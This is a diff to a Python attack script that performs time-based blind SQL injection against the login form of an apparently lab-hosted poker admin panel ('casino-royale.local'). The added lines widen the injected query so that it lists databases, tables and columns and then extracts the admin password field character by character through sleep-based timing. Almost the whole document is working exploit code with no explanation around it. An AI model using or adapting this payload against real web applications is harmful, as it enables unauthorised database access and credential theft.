@@ -9,6 +9,10 @@ num_workers = 5
 
 target_url = "http://casino-royale.local/pokeradmin/"
 target_discover = "database()"
+target_discover = "(select group_concat(schema_name) from information_schema.schemata)"
+target_discover = "(select group_concat(table_name SEPARATOR '-') from information_schema.tables where table_schema='pokerleague')"
+target_discover = "(select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin')"
+target_discover = "(select group_concat(password) from pokerleague.pokermax_admin)"
 
 
 def sigint_handler():
@@ -16,7 +20,7 @@ def sigint_handler():
 
 signal.signal(signal.SIGINT, sigint_handler)
 sleep_time = 0.05
-characters = string.ascii_lowercase + "-_"
+characters = string.ascii_lowercase + string.digits + "-_"
 
 payload = "admin' and if(substring({0}".format(target_discover) + ",{0},1)='{1}', sleep("+"{0}),1)-- -".format(sleep_time) # .format(pos, char)
 
@@ -30,7 +34,7 @@ def discover_length():
 
         post_data = {
             'op': 'adminlogin',
-            'username': "' or (1=1 and if(CHAR_LENGTH(DATABASE())={0}, sleep({1}),1)) -- - ".format(l, sleep_time),
+            'username': "' or (1=1 and if(CHAR_LENGTH({2})={0}, sleep({1}),1)) -- - ".format(l, sleep_time, target_discover),
             'password': 'test'
 
         }
@@ -50,7 +54,7 @@ p2 = log.progress("Discovering [{0}]".format(target_discover))
 
 p2.status("Discovering [{0}] ({1} chars)".format(target_discover, str(target_discover_length)))
 
-result = "_" * target_discover_length
+result = "*" * target_discover_length
 
 
 
@@ -90,7 +94,7 @@ def inject():
         for future in concurrent.futures.as_completed(results):
             res = future.result()
 ##########
-
+    p1.success()
 
 #    for i in range(0, result.length() + 1):
  #       discover_char(result, i)
@@ -98,3 +102,4 @@ def inject():
 
 if __name__ == '__main__':
     inject()
+
